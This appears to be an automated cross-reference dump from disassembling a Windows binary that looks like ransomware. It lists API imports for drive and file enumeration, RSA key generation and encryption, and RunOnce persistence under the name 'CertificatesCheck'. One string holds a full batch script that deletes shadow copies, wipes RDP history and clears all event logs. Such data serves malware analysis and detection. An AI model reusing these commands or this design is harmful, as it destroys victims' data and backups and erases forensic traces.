reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4039be	0x403b6c	string	0x403943	_^]3
0x403a87	0x403b6c	string	0x403943	_^]3
0x403b03	0x403b6c	string	0x403943	_^]3
0x403dd8	0x405b17	string	0x403d9c	QQSVW
0x403f18	0x405b17	string	0x403e9f	QQSVW
0x403fcc	0x405b17	string	0x403e9f	QQSVW
0x404022	0x405b17	string	0x403e9f	QQSVW
0x4041a1	0x404e53	string	0x404173	QSUV
0x4041ee	0x40458b	string	0x4041cc	_^][
0x40431e	0x405b17	string	0x4041cc	QQSVW
0x404377	0x405b17	string	0x4041cc	QQSVW
0x40438c	0x405b17	string	0x4041cc	QQSVW
0x4043b2	0x405b17	string	0x4041cc	QQSVW
0x40440b	0x405b17	string	0x4041cc	QQSVW
0x404420	0x405b17	string	0x4041cc	QQSVW
0x404648	0x405b17	string	0x4045db	QQSVW
0x40465d	0x405b17	string	0x4045db	QQSVW
0x40468c	0x405b17	string	0x4045db	QQSVW
0x4046aa	0x405b17	string	0x4045db	QQSVW
0x404702	0x405b17	string	0x4045db	QQSVW
0x404d6c	0x404d72	string	0x404d14	3҉T$ blocks=Basic Latin,Cyrillic
0x404d9b	0x405576	string	0x404d14	QQSU
0x404dae	0x405576	string	0x404d14	QQSU
0x404e6a	0x404efa	string	0x404e53	^][Y
0x404f1d	0x404f6a	string	0x404f01	_^[Y
0x404fd8	0x4053d9	string	0x404fb5	_^][
0x40504b	0x4053d9	string	0x404fb5	_^][
0x405188	0x405b17	string	0x404fb5	QQSVW
0x405374	0x405b17	string	0x404fb5	QQSVW
0x405536	0x405576	string	0x405448	QQSU
0x4058f4	0x40590b	string	0x4058bf	^_][
0x405b77	0x405bb2	string	0x405b17	]_^3
0x405b7e	0x405bb2	string	0x405b17	]_^3
0x405c0f	0x405c86	string	0x405bca	_^][
0x405d12	0x405de3	string	0x405ced	_^][
0x405e06	0x404e53	string	0x405ded	QSUV
0x405e36	0x405ded	string	0x405ded	QQSU
0x405e7f	0x401028	import	0x405e69	KERNEL32.dll.lstrlenA
0x40615a	0x406190	string	0x40612b	][_^
0x4062a6	0x4062b0	string	0x40628f	j03ۍD$,SP blocks=Basic Latin,Arabic
0x4062ab	0x406343	string	0x40628f	_^][
0x4062db	0x406343	string	0x40628f	_^][
0x406373	0x4063df	string	0x40634d	_^][
0x406592	0x40655f	string	0x406483	3ҍL$ blocks=Basic Latin,Cyrillic
0x406912	0x40101c	import	0x4068f9	ADVAPI32.dll.CryptAcquireContextW
0x40692c	0x401014	import	0x4068f9	ADVAPI32.dll.CryptGenRandom
0x40693a	0x401018	import	0x4068f9	ADVAPI32.dll.CryptReleaseContext
0x406943	0x40694f	string	0x4068f9	^_[]
0x406945	0x401018	import	0x4068f9	ADVAPI32.dll.CryptReleaseContext
0x406bf1	0x406bfa	string	0x406bef	ËT$\b blocks=Latin-1 Supplement,Basic Latin
0x406c37	0x4073a5	string	0x406bef	VWj\e
0x406d47	0x406d4c	string	0x406d36	QQSU
0x406df5	0x406e03	string	0x406d36	_^][YY
0x406dfc	0x406e03	string	0x406d36	_^][YY
0x406ffe	0x407009	string	0x406d36	_^][
0x407002	0x407009	string	0x406d36	_^][
0x407035	0x4070ef	string	0x407013	_^][
0x40704a	0x4070ef	string	0x407013	_^][
0x407062	0x4070ef	string	0x407013	_^][
0x407072	0x4070ef	string	0x407013	_^][
0x407094	0x4070ef	string	0x407013	_^][
0x4070ab	0x4070ef	string	0x407013	_^][
0x4070d4	0x4070ef	string	0x407013	_^][
0x4070e8	0x4070ef	string	0x407013	_^][
0x407355	0x407360	string	0x407176	_^][
0x407359	0x407360	string	0x407176	_^][
0x4073c3	0x407398	string	0x4073c1	QjlX
0x407810	0x4088fe	string	0x407804	UVW3\v
0x407861	0x4010f8	import	0x407804	ole32.dll.CoCreateGuid
0x407876	0x4010fc	import	0x407804	ole32.dll.StringFromGUID2
0x407893	0x401034	import	0x407804	KERNEL32.dll.WideCharToMultiByte
0x4078b5	0x40103c	import	0x407804	KERNEL32.dll.CreateFileW
0x4078cc	0x401040	import	0x407804	KERNEL32.dll.GetFileSizeEx
0x4078f0	0x401028	import	0x407804	KERNEL32.dll.lstrlenA
0x40797e	0x401028	import	0x407804	KERNEL32.dll.lstrlenA
0x407a89	0x402a90	string	0x407804	WVS3
0x407abf	0x401038	import	0x407804	KERNEL32.dll.ReadFile
0x407b1d	0x401030	import	0x407804	KERNEL32.dll.WriteFile
0x407b48	0x401038	import	0x407804	KERNEL32.dll.ReadFile
0x407bd0	0x401030	import	0x407804	KERNEL32.dll.WriteFile
0x407bfb	0x401030	import	0x407804	KERNEL32.dll.WriteFile
0x407c12	0x401030	import	0x407804	KERNEL32.dll.WriteFile
0x407c45	0x401030	import	0x407804	KERNEL32.dll.WriteFile
0x407c58	0x401028	import	0x407804	KERNEL32.dll.lstrlenA
0x407c61	0x401030	import	0x407804	KERNEL32.dll.WriteFile
0x407c68	0x4010b0	import	0x407804	KERNEL32.dll.CloseHandle
0x407cac	0x40102c	import	0x407c93	KERNEL32.dll.SetFilePointerEx
0x407cb6	0x401044	import	0x407c93	KERNEL32.dll.GetLastError
0x407d42	0x401048	import	0x407d3b	KERNEL32.dll.ExitProcess
0x407d6c	0x401080	import	0x407d49	KERNEL32.dll.GetModuleFileNameW
0x407d72	0x40104c	import	0x407d49	KERNEL32.dll.GetEnvironmentVariableW
0x407d7e	0x4026d8	string	0x407d49	temp
0x407d9e	0x402220	string	0x407d49	CE325EA89C11414D9D1FE1BFD83D493AC5F14ECAE1FA1740F0372CE48965E26E839D77EF908CA11909F01420FFC3F2B9F0353456FDF8F459B69987BCBBD4D00D7CE4373C2661F72F71EB62251D4867C5F61AC1D0E91A7450EB4F833A4173608F7701E5B652BC0F039C0AA5F883AF6473C41A9E380005CCF9DECFFC9BBE00BB705B496804A3CDB2415BF62D69A66B3E2D1F5803BDF824046676E78E7B751B992B434A4127EDAA0467123C39F02ACDC5AA083CB9D9255E9E400A91E3ED4E7162AD4D8E72B1AC2E719CB974E2A81BF2F4702D71330A6B36BD71A22567D4A71E9A196E88FE06170697C0DF820B461A3FDF4CE8732BA750F611B0216F93597AEE5549
0x407da4	0x40105c	import	0x407d49	KERNEL32.dll.lstrcpynA
0x407dd2	0x40874d	string	0x407d49	UVW3\v
0x407df0	0x4082a8	string	0x407d49	SUVW
0x407e10	0x4082a8	string	0x407d49	SUVW
0x407e31	0x4082a8	string	0x407d49	SUVW
0x407e51	0x4026e4	string	0x407d49	appdata
0x407e5e	0x401048	import	0x407d49	KERNEL32.dll.ExitProcess
0x407e64	0x401098	import	0x407d49	KERNEL32.dll.lstrcatW
0x407e7a	0x4010e8	import	0x407d49	SHLWAPI.dll.PathFindFileNameW
0x407e94	0x401094	import	0x407d49	KERNEL32.dll.lstrcmpiW
0x407eb8	0x401078	import	0x407d49	KERNEL32.dll.CopyFileW
0x407edc	0x4026f4	string	0x407d49	public
0x407ef0	0x402704	string	0x407d49	ALLUSERSPROFILE
0x407f04	0x40874d	string	0x407d49	UVW3\v
0x407f09	0x4010a4	import	0x407d49	KERNEL32.dll.lstrcpyW
0x407f3c	0x401004	import	0x407d49	ADVAPI32.dll.GetCurrentHwProfileW
0x407fc2	0x401074	import	0x407d49	KERNEL32.dll.Sleep
0x40800f	0x401088	import	0x407d49	KERNEL32.dll.GetStdHandle
0x40801b	0x402724	string	0x407d49	{{IDENTIFIER}}
0x4080ea	0x40103c	import	0x4080cf	KERNEL32.dll.CreateFileW
0x4080f7	0x401044	import	0x4080cf	KERNEL32.dll.GetLastError
0x4080fd	0x4081ec	string	0x4080cf	_^][
0x408102	0x401044	import	0x4080cf	KERNEL32.dll.GetLastError
0x40811f	0x40106c	import	0x4080cf	KERNEL32.dll.lstrcpyA
0x40812c	0x401058	import	0x4080cf	KERNEL32.dll.SetFilePointer
0x408133	0x401028	import	0x4080cf	KERNEL32.dll.lstrlenA
0x40814c	0x401030	import	0x4080cf	KERNEL32.dll.WriteFile
0x408183	0x40103c	import	0x4080cf	KERNEL32.dll.CreateFileW
0x4081a2	0x401038	import	0x4080cf	KERNEL32.dll.ReadFile
0x4081bd	0x401058	import	0x4080cf	KERNEL32.dll.SetFilePointer
0x4081d5	0x401038	import	0x4080cf	KERNEL32.dll.ReadFile
0x4081e4	0x4010b0	import	0x4080cf	KERNEL32.dll.CloseHandle
0x40820f	0x402620	string	0x4081f4	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x40821d	0x401008	import	0x4081f4	ADVAPI32.dll.RegOpenKeyExW
0x408225	0x40829d	string	0x4081f4	_^][
0x40823b	0x402684	string	0x4081f4	CertificatesCheck
0x408244	0x40100c	import	0x4081f4	ADVAPI32.dll.RegQueryValueExW
0x408250	0x401094	import	0x4081f4	KERNEL32.dll.lstrcmpiW
0x40826c	0x401010	import	0x4081f4	ADVAPI32.dll.RegCreateKeyExW
0x408277	0x4010c0	import	0x4081f4	KERNEL32.dll.lstrlenW
0x408284	0x402684	string	0x4081f4	CertificatesCheck
0x40828d	0x401020	import	0x4081f4	ADVAPI32.dll.RegSetValueExW
0x408297	0x401000	import	0x4081f4	ADVAPI32.dll.RegCloseKey
0x4082c4	0x401028	import	0x4082a8	KERNEL32.dll.lstrlenA
0x4082e4	0x4010cc	import	0x4082a8	KERNEL32.dll.HeapCreate
0x4082f4	0x4010d4	import	0x4082a8	KERNEL32.dll.HeapAlloc
0x408346	0x4010d0	import	0x408336	KERNEL32.dll.GetProcessHeap
0x40834d	0x4010d4	import	0x408336	KERNEL32.dll.HeapAlloc
0x408355	0x401068	import	0x408336	KERNEL32.dll.GetLogicalDrives
0x40838e	0x401070	import	0x408336	KERNEL32.dll.GetDriveTypeA
0x4083ae	0x4010d0	import	0x408336	KERNEL32.dll.GetProcessHeap
0x4083b5	0x4010d4	import	0x408336	KERNEL32.dll.HeapAlloc
0x4083c6	0x40106c	import	0x408336	KERNEL32.dll.lstrcpyA
0x4083e1	0x40108c	import	0x408336	KERNEL32.dll.lstrcmpiA
0x408413	0x40874d	string	0x408401	UVW3\v
0x40841e	0x408eec	string	0x408401	SVWj\b
0x40842e	0x408621	string	0x408401	_^][
0x408434	0x401098	import	0x408401	KERNEL32.dll.lstrcatW
0x40843a	0x401094	import	0x408401	KERNEL32.dll.lstrcmpiW
0x408458	0x4010c0	import	0x408401	KERNEL32.dll.lstrlenW
0x408480	0x401054	import	0x408401	KERNEL32.dll.FindFirstFileW
0x4084d6	0x4088fe	string	0x408401	UVW3\v
0x4084e8	0x4087c9	string	0x408401	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x40850f	0x408eec	string	0x408401	SVWj\b
0x40851a	0x4087c9	string	0x408401	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x408554	0x4010e8	import	0x408401	SHLWAPI.dll.PathFindFileNameW
0x40857e	0x4010a8	import	0x408401	KERNEL32.dll.SetFileAttributesW
0x40858a	0x4087c9	string	0x408401	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x4085b0	0x4010a4	import	0x408401	KERNEL32.dll.lstrcpyW
0x4085d8	0x401064	import	0x408401	KERNEL32.dll.MoveFileExW
0x4085fb	0x40109c	import	0x408401	KERNEL32.dll.FindNextFileW
0x40860a	0x401090	import	0x408401	KERNEL32.dll.FindClose
0x408634	0x4010e0	import	0x40862e	SHLWAPI.dll.PathRemoveFileSpecW
0x40863a	0x401098	import	0x40862e	KERNEL32.dll.lstrcatW
0x40866e	0x40103c	import	0x40862e	KERNEL32.dll.CreateFileW
0x40868a	0x401028	import	0x40862e	KERNEL32.dll.lstrlenA
0x408698	0x401030	import	0x40862e	KERNEL32.dll.WriteFile
0x40869f	0x4010b0	import	0x40862e	KERNEL32.dll.CloseHandle
0x4086ab	0x40107c	import	0x4086aa	KERNEL32.dll.GetFileAttributesW
0x4086e0	0x401050	import	0x4086bd	KERNEL32.dll.GetTempFileNameW
0x4086e6	0x4025f0	string	0x4086bd	.bat
0x4086f2	0x401098	import	0x4086bd	KERNEL32.dll.lstrcatW
0x40870e	0x40103c	import	0x4086bd	KERNEL32.dll.CreateFileW
0x40871f	0x402428	string	0x4086bd	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x408726	0x401028	import	0x4086bd	KERNEL32.dll.lstrlenA
0x40872f	0x401030	import	0x4086bd	KERNEL32.dll.WriteFile
0x408736	0x4010b0	import	0x4086bd	KERNEL32.dll.CloseHandle
0x40875c	0x401084	import	0x40874d	KERNEL32.dll.MultiByteToWideChar
0x40877b	0x401084	import	0x40874d	KERNEL32.dll.MultiByteToWideChar
0x4087bd	0x401060	import	0x408787	KERNEL32.dll.CreateProcessW
0x408827	0x401028	import	0x4087c9	KERNEL32.dll.lstrlenA
0x408833	0x401028	import	0x4087c9	KERNEL32.dll.lstrlenA
0x408841	0x401028	import	0x4087c9	KERNEL32.dll.lstrlenA
0x408851	0x401028	import	0x4087c9	KERNEL32.dll.lstrlenA
0x40885a	0x40108c	import	0x4087c9	KERNEL32.dll.lstrcmpiA
0x40890e	0x401034	import	0x4088fe	KERNEL32.dll.WideCharToMultiByte
0x40892a	0x401034	import	0x4088fe	KERNEL32.dll.WideCharToMultiByte
0x408a0c	0x401028	import	0x408a05	KERNEL32.dll.lstrlenA
0x408a16	0x408996	string	0x408a05	QSUVW
0x408afe	0x401028	import	0x408ab3	KERNEL32.dll.lstrlenA
0x408b28	0x401030	import	0x408ab3	KERNEL32.dll.WriteFile
0x408b80	0x402740	string	0x408b47	rsa_genkey
0x408b86	0x401028	import	0x408b47	KERNEL32.dll.lstrlenA
0x408ce4	0x402220	string	0x408b47	CE325EA89C11414D9D1FE1BFD83D493AC5F14ECAE1FA1740F0372CE48965E26E839D77EF908CA11909F01420FFC3F2B9F0353456FDF8F459B69987BCBBD4D00D7CE4373C2661F72F71EB62251D4867C5F61AC1D0E91A7450EB4F833A4173608F7701E5B652BC0F039C0AA5F883AF6473C41A9E380005CCF9DECFFC9BBE00BB705B496804A3CDB2415BF62D69A66B3E2D1F5803BDF824046676E78E7B751B992B434A4127EDAA0467123C39F02ACDC5AA083CB9D9255E9E400A91E3ED4E7162AD4D8E72B1AC2E719CB974E2A81BF2F4702D71330A6B36BD71A22567D4A71E9A196E88FE06170697C0DF820B461A3FDF4CE8732BA750F611B0216F93597AEE5549
0x408d4b	0x408a37	string	0x408b47	SUVW
0x408db6	0x402734	string	0x408d5d	rsa_encrypt
0x408dbc	0x401028	import	0x408d5d	KERNEL32.dll.lstrlenA
0x408dee	0x402218	string	0x408d5d	010001
0x408e9e	0x4010c0	import	0x408e99	KERNEL32.dll.lstrlenW
0x408eb6	0x4010a4	import	0x408e99	KERNEL32.dll.lstrcpyW
0x408ed5	0x4010a4	import	0x408ec1	KERNEL32.dll.lstrcpyW
